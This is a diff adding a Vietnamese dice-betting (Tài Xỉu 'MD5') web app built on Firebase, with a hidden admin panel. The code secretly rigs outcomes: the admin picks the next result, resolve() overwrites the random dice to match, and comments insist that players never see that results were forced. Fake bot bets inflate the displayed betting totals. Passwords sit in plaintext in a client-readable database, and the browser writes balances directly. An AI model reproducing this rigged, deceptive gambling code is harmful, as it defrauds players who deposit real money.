@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>LUCKYWIN - SYSTEM</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+    <style>
+        :root { --gold: #ffdf00; --bg: #0b0b0d; --p: #1a1a1f; --red: #ff3131; --blue: #00f2ff; }
+        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: var(--bg); color: #fff; margin: 0; overflow: hidden; height: 100vh; }
+        .page { display: none; height: 100vh; width: 100vw; overflow-y: auto; }
+        .active { display: block; }
+        .header { display: flex; justify-content: space-between; padding: 15px; background: #111; border-bottom: 1px solid #333; }
+        .game-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 20px; }
+        .game-card { background: #1a1a1f; border: 1px solid #333; border-radius: 15px; padding: 20px; text-align: center; }
+        .game-card img { width: 55px; }
+        .game-card b { display: block; margin-top: 8px; color: var(--gold); font-size: 13px; }
+        .timer-circle { width: 70px; height: 70px; border: 4px solid var(--gold); border-radius: 50%; margin: 10px auto; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold; color: var(--gold); }
+        .bet-stats { display: flex; justify-content: space-around; background: #000; padding: 10px; border-radius: 10px; margin: 10px; border: 1px solid #333; }
+        .history-dots { display: flex; flex-wrap: wrap; justify-content: center; gap: 5px; padding: 10px; background: #111; margin: 10px; border-radius: 10px; min-height: 40px;}
+        .dot { width: 12px; height: 12px; border-radius: 50%; }
+        .dot.T { background: var(--red); box-shadow: 0 0 5px var(--red); }
+        .dot.X { background: var(--blue); box-shadow: 0 0 5px var(--blue); }
+        #adm-crystal { position: fixed; bottom: 20px; right: 20px; width: 50px; height: 50px; background: radial-gradient(circle at 30% 30%, #444, #000); border-radius: 50%; z-index: 9999; cursor: pointer; display: none; border: 1px solid #333; }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 10000; padding: 15px; overflow-y: auto; }
+        .adm-box { background: #111; border: 1px solid #444; padding: 12px; border-radius: 10px; margin-bottom: 10px; }
+        .btn-gold { background: var(--gold); color: #000; border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div id="auth-page" class="page active">
+        <div style="padding: 60px 25px; text-align: center;">
+            <h1 style="color:var(--gold); letter-spacing: 5px;">LUCKY WIN</h1>
+            <div id="login-form">
+                <input type="text" id="l-u" placeholder="Tên đăng nhập" style="width:100%; padding:15px; margin:10px 0; border-radius:8px; background:#000; color:#fff; border:1px solid #333;">
+                <input type="password" id="l-p" placeholder="Mật khẩu" style="width:100%; padding:15px; margin:10px 0; border-radius:8px; background:#000; color:#fff; border:1px solid #333;">
+                <button class="btn-gold" onclick="login()">ĐĂNG NHẬP</button>
+                <p onclick="toggleAuth(false)" style="color:#555; margin-top:20px; font-size:14px;">Tạo tài khoản mới</p>
+            </div>
+            <div id="reg-form" style="display:none;">
+                <input type="text" id="r-u" placeholder="Tên tài khoản">
+                <input type="password" id="r-p" placeholder="Mật khẩu">
+                <button class="btn-gold" onclick="register()">ĐĂNG KÝ</button>
+                <p onclick="toggleAuth(true)" style="color:#555; margin-top:20px;">Quay lại</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="lobby-page" class="page">
+        <div class="header">
+            <span>👤 <b id="u-id-l"></b></span>
+            <span style="color:var(--gold)"><b id="u-bl-l">0</b>đ</span>
+        </div>
+        <div class="game-grid">
+            <div class="game-card" onclick="showPage('game-page')">
+                <img src="https://img.icons8.com/fluency/96/dice.png">
+                <b>TÀI XỈU MD5</b>
+            </div>
+            <div class="game-card" onclick="alert('Đang cập nhật...')">
+                <img src="https://img.icons8.com/fluency/96/roulette.png">
+                <b>XÓC ĐĨA</b>
+            </div>
+        </div>
+        <div style="padding:20px;"><button class="btn-gold" onclick="openModal('nap-modal')">NẠP/RÚT TIỀN</button></div>
+    </div>
+
+    <div id="game-page" class="page">
+        <div class="header">
+            <span onclick="showPage('lobby-page')" style="color:var(--gold)">❮ SẢNH</span>
+            <span style="color:var(--gold)"><b id="u-bl-g">0</b>đ</span>
+        </div>
+        <div style="text-align:center;">
+            <div class="timer-circle" id="timer">30</div>
+            <div id="dice-area" style="font-size:70px; margin:10px 0;">🎲🎲🎲</div>
+            <div id="res-t" style="height:40px; font-size:26px; font-weight:900; color:var(--gold);"></div>
+            
+            <div class="bet-stats">
+                <div>TÀI<br><span id="s-tai" style="color:var(--red); font-weight:bold;">0</span></div>
+                <div>XỈU<br><span id="s-xiu" style="color:var(--blue); font-weight:bold;">0</span></div>
+            </div>
+            <div class="history-dots" id="soi-cau"></div>
+
+            <div style="display:flex; justify-content:center; gap:10px; margin-top:15px;">
+                <button onclick="bet('tai')" style="width:45%; padding:18px; background:var(--red); border:none; border-radius:10px; color:#fff; font-size:22px; font-weight:bold;">TÀI</button>
+                <button onclick="bet('xiu')" style="width:45%; padding:18px; background:var(--blue); border:none; border-radius:10px; color:#fff; font-size:22px; font-weight:bold;">XỈU</button>
+            </div>
+            <p id="my-bet-info" style="color:var(--gold); font-weight:bold; margin-top:10px;"></p>
+        </div>
+    </div>
+
+    <div id="adm-crystal" onclick="openModal('adm-modal')"></div>
+
+    <div id="adm-modal" class="modal">
+        <h3 style="text-align:center; color:var(--blue);">HỆ THỐNG ĐIỀU HƯỚNG</h3>
+        <div class="adm-box">
+            <b>CẤU HÌNH KẾT QUẢ TIẾP THEO:</b>
+            <select id="adm-next" style="width:100%; padding:10px; margin:10px 0; background:#000; color:#fff; border:1px solid #333;">
+                <option value="">-- AUTO --</option>
+                <option value="tai">KẾT QUẢ: TÀI</option>
+                <option value="xiu">KẾT QUẢ: XỈU</option>
+            </select>
+            <button class="btn-gold" onclick="setControl()">LƯU CẤU HÌNH</button>
+        </div>
+        <div class="adm-box">
+            <b>ĐIỀU CHỈNH CHỈ SỐ VÍ:</b>
+            <input type="text" id="adm-u-id" placeholder="ID khách..." style="width:100%; padding:10px; margin:5px 0;">
+            <input type="number" id="adm-u-amt" placeholder="Giá trị biến động..." style="width:100%; padding:10px; margin:5px 0;">
+            <button class="btn-gold" style="background:#28a745; color:#fff;" onclick="editUser()">CẬP NHẬT</button>
+        </div>
+        <div class="adm-box">
+            <b>YÊU CẦU GIAO DỊCH:</b>
+            <div id="adm-naps" style="font-size:11px;"></div>
+        </div>
+        <div class="adm-box">
+            <b>TRẠNG THÁI LUỒNG CƯỢC:</b>
+            <div id="adm-live" style="color:var(--gold); font-size:11px;"></div>
+        </div>
+        <button class="btn-gold" style="background:#333; color:#fff;" onclick="closeModal('adm-modal')">THOÁT</button>
+    </div>
+
+<script>
+    const firebaseConfig = { databaseURL: "https://shopmduy-default-rtdb.asia-southeast1.firebasedatabase.app" };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    let curU, userD = {}, timeLeft = 30, mySide = null, myAmt = 0;
+    let bT = 0, bX = 0;
+
+    function showPage(id) { document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
+    function openModal(id) { document.getElementById(id).style.display = 'block'; }
+    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+    function toggleAuth(isL) { document.getElementById('login-form').style.display = isL?'block':'none'; document.getElementById('reg-form').style.display = isL?'none':'block'; }
+
+    function login() {
+        const u = document.getElementById('l-u').value.toLowerCase().trim();
+        const p = document.getElementById('l-p').value;
+        db.ref('users/'+u).once('value', s => {
+            if(s.exists() && s.val().password === p) {
+                curU = u; document.getElementById('u-id-l').innerText = u.toUpperCase();
+                showPage('lobby-page');
+                if(u === 'menu') document.getElementById('adm-crystal').style.display = 'block';
+                db.ref('users/'+u).on('value', snap => { userD = snap.val(); document.getElementById('u-bl-l').innerText = document.getElementById('u-bl-g').innerText = (userD.balance||0).toLocaleString(); });
+                startSystem();
+            } else alert("Sai thông tin!");
+        });
+    }
+
+    function startSystem() {
+        // Soi cầu - Chỉ hiện T/X, ko hiện chữ "Ép"
+        db.ref('history').limitToLast(18).on('value', s => {
+            let h = ""; s.forEach(d => { h += `<div class="dot ${d.val().res === 'tai' ? 'T' : 'X'}"></div>`; });
+            document.getElementById('soi-cau').innerHTML = h;
+        });
+
+        if(curU === 'menu') {
+            db.ref('live_bets').on('value', s => {
+                let txt = ""; s.forEach(b => { txt += `<div>${b.key}: ${b.val().side} (${b.val().amount.toLocaleString()})</div>`; });
+                document.getElementById('adm-live').innerHTML = txt || "Đang trống...";
+            });
+            db.ref('bank_requests').on('value', s => {
+                let l = document.getElementById('adm-naps'); l.innerHTML = "";
+                s.forEach(c => { if(c.val().status==='pending') l.innerHTML += `<div>${c.val().memo} +${c.val().amount} <button onclick="appr('${c.key}','${c.val().user}',${c.val().amount})">DUYỆT</button></div>`; });
+            });
+        }
+
+        setInterval(() => {
+            timeLeft--;
+            if(timeLeft < 0) { timeLeft = 35; reset(); }
+            if(timeLeft === 30) runBot();
+            document.getElementById('timer').innerText = timeLeft > 30 ? "MỞ" : timeLeft;
+            if(timeLeft === 0) resolve();
+        }, 1000);
+    }
+
+    function runBot() {
+        if(timeLeft > 5 && timeLeft <= 30) {
+            let s = Math.random() > 0.5 ? 'tai' : 'xiu';
+            let a = (Math.floor(Math.random()*20)+1) * 50000;
+            if(s==='tai') bT += a; else bX += a;
+            db.ref('live_summary').once('value', s => {
+                let r = s.val() || {tai:0, xiu:0};
+                document.getElementById('s-tai').innerText = ((r.tai||0) + bT).toLocaleString();
+                document.getElementById('s-xiu').innerText = ((r.xiu||0) + bX).toLocaleString();
+            });
+            setTimeout(runBot, Math.random()*1200 + 400);
+        }
+    }
+
+    function resolve() {
+        db.ref('system/control').once('value', s => {
+            const ctrl = s.val() || {}; let t = ctrl.next;
+            let d1=Math.floor(Math.random()*6)+1, d2=Math.floor(Math.random()*6)+1, d3=Math.floor(Math.random()*6)+1;
+            let res = (d1+d2+d3) >= 11 ? 'tai' : 'xiu';
+            
+            // Ép ngầm, không báo ra giao diện
+            if(t && res !== t) { if(t==='tai'){d1=6;d2=5;d3=4;} else {d1=1;d2=1;d3=2;} res = t; }
+            
+            document.getElementById('dice-area').innerHTML = res==='tai'?'⚄⚅⚃':'⚀⚁⚂';
+            document.getElementById('res-t').innerText = res.toUpperCase() + " ("+(d1+d2+d3)+")"; // Tuyệt đối ko có chữ "Ép"
+            
+            db.ref('history').push({ res: res });
+            if(mySide === res) { db.ref('users/'+curU+'/balance').transaction(v => (v||0) + (myAmt * 1.95)); confetti(); }
+            if(t) db.ref('system/control/next').remove();
+        });
+    }
+
+    function bet(side) {
+        if(timeLeft < 5 || timeLeft > 30) return alert("Hết thời gian!");
+        let amt = 50000;
+        if(userD.balance < amt) return alert("Không đủ tiền!");
+        db.ref('users/'+curU+'/balance').set(userD.balance - amt);
+        mySide = side; myAmt += amt;
+        document.getElementById('my-bet-info').innerText = `ĐẶT ${side.toUpperCase()}: ${myAmt.toLocaleString()}`;
+        db.ref('live_bets/'+curU).set({ side: side, amount: myAmt });
+        db.ref('live_summary/'+side).transaction(v=>(v||0)+amt);
+    }
+
+    function setControl() { db.ref('system/control/next').set(document.getElementById('adm-next').value).then(()=>alert("Đã lưu cấu hình!")); }
+    function editUser() {
+        const u = document.getElementById('adm-u-id').value.toLowerCase();
+        const a = Number(document.getElementById('adm-u-amt').value);
+        db.ref('users/'+u+'/balance').transaction(v => (v||0) + a).then(()=>alert("Hoàn tất!"));
+    }
+    function reset() { mySide = null; myAmt = 0; bT=0; bX=0; document.getElementById('res-t').innerText = ""; document.getElementById('my-bet-info').innerText = ""; db.ref('live_bets').remove(); db.ref('live_summary').remove(); }
+</script>
+</body>
+</html>
